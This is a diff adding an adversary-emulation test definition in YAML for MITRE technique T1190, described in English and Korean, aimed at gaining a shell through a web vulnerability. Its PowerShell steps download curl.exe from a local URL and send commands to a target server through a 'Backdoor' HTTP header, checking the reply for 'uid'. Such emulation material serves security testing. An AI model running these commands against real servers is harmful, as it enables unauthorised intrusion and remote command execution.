@@ -1,0 +1,83 @@
+attack_technique: T1190
+display_name: 'Exploit Public-Facing Application'
+category:
+    - Initial Access
+progress: Complete
+atomic_tests:
+    - name: 'Exploit Public-Facing Application'
+      description: |
+        English : Acquiring a shell using a web vulnerability
+
+        Korean : 
+        웹 취약점을 사용하여 커맨드 인젝션하는 기법
+
+         - Execute : curl을 사용해 커맨드 인젝션
+         - Pre : 필요 없음
+         - Input : target IP, 실행할 커맨드, curl 다운로드 url
+         - dependencies: curl 
+         - Output : 커맨드 인젝션 결과
+         - Post : 커맨드 인젝션 결과 확인
+          
+      supported_platforms:
+        - windows
+      pre:
+        prepare_executor_name: ""
+        command: ""
+      input_arguments: 
+        target_ip:
+            description: IP for Target
+            type: Url
+            default: http://192.168.103.18
+        command:
+            description: command
+            type: String
+            default: 'id'
+        curldownloadurl:
+            description: curl file url
+            type: Url
+            default: 'http://127.0.0.1:8080/T1190/curl.exe'
+      dependency_executor_name: powershell
+      dependencies:
+        - description: |
+            curl 
+          prereq_command: |
+            if(ls $env:temp\T1190\curl.exe) { exit 0 } else { exit 1 }
+          get_prereq_command: |
+            New-Item -ItemType Directory "$env:temp/T1190" -Force | Out-Null
+            $WebRequest=New-Object System.Net.WebClient
+            $WebRequest.UseDefaultCredentials=$true
+            #$WebRequest.Credentials=(Get-Credential)
+            $Data=$WebRequest.DownloadData("#{curldownloadurl}")
+            [System.IO.File]::WriteAllBytes("$env:temp\T1190\curl.exe",$Data)
+      executor:
+        name: powershell
+        command: |
+            .$env:temp\T1190\curl.exe #{target_ip}/ -H "Backdoor:#{command}"
+      output:
+        output_executor_name: powershell
+        command: |
+            .$env:temp\T1190\curl.exe  #{target_ip}/ -H "Backdoor:#{command}"
+      post:
+        post_executor_name: powershell
+        command: |
+            $result = (.$env:temp\T1190\curl.exe  #{target_ip}/ -H "Backdoor:id")
+            if (echo $result | findstr "uid") { exit 0 } else { exit 1 }
+      technique_remote: True
+      source:
+        pre_state: 
+          - Compromised : True
+          - OS_type : Windows
+          - OS_status : Running
+          - Web_s : Not Unavailable
+      dest:
+        pre_state:
+          - Compromised : False
+          - Reachable : True
+          - Discovered : True
+          - Web : True
+          - Web_s : Running
+          - Web_v : CVE-1
+        post_state:
+          - Compromised : True
+          - Privilege : Web
+
